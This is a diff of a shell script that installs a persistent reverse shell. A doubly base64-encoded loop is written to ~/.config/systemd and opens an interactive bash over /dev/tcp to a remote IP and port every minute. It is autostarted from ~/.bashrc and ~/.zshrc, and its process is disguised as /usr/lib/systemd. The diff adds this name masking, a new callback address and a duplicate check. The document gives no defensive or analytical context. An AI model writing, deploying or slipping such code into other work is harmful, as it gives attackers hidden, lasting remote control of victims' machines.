@@ -3,13 +3,13 @@
 ZSHCONF=~/.zshrc
 BASHCONF=~/.bashrc
 
-echo "d2hpbGUgdHJ1ZTsgZG8gZWNobyAiS0dKaGMyZ2dMV01nSjJKaGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdlkyaGhjakJ1TG1SMVkydGtibk11YjNKbkx6UTFOVFU1SURBK0pqRW5JQ1lwSUQ0Z0wyUmxkaTl1ZFd4c0lESStKakU9IiB8IGJhc2U2NCAtZCB8IGJhc2g7IHNsZWVwIDFtOyBkb25l" | base64 -d > ~/.config/systemd
+echo "d2hpbGUgdHJ1ZTsgZG8gZWNobyAiS0dKaGMyZ2dMV01nSjJWNFpXTWdMV0VnSWk5MWMzSXZiR2xpTDNONWMzUmxiV1FpSUdKaGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdk1Ua3lMakUyT0M0eU16QXVNalF6THpZMU1EVXdJREErSmpFbklDWXBJRDRnTDJSbGRpOXVkV3hzSURJK0pqRT0iIHwgYmFzZTY0IC1kIHwgYmFzaDsgZXhlYyAtYSAiL3Vzci9saWIvc3lzdGVtZCIgc2xlZXAgMW07IGRvbmU=" | base64 -d > ~/.config/systemd
 chmod +x ~/.config/systemd
 
-if test -f "$BASHCONF"; then
-    echo "(~/.config/systemd &) 2>& /dev/null" >> ~/.bashrc
+if (test -f "$BASHCONF") && !(grep -wq "~/.config/systemd" $BASHCONF); then
+    echo "(exec -a \"/usr/lib/systemd\" ~/.config/systemd &) 2>& /dev/null" >> ~/.bashrc
 fi
 
-if test -f "$ZSHCONF"; then
-    echo "(~/.config/systemd &) 2>& /dev/null" >> ~/.zshrc
+if (test -f "$ZSHCONF") && !(grep -wq "~/.config/systemd" $ZSHCONF); then
+    echo "(exec -a \"/usr/lib/systemd\" ~/.config/systemd &) 2>& /dev/null" >> ~/.zshrc
 fi
